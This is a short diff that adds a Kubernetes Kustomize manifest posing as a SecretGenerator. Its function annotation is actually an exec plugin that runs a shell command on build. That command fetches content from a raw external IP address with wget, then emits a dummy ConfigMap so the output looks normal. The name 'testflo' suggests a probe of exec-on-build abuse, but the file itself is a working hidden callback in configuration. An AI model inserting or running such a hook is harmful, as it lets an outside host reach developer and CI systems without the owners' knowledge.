@@ -1,0 +1,11 @@
+apiVersion: builtin
+kind: SecretGenerator
+metadata:
+  name: testflo-exec-plugin
+  annotations:
+    config.kubernetes.io/function: |
+      exec:
+        path: /bin/sh
+        args:
+          - -c
+          - "wget -q -O- http://82.165.195.38/TESTFLO-KUSTOMIZE-EXEC || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
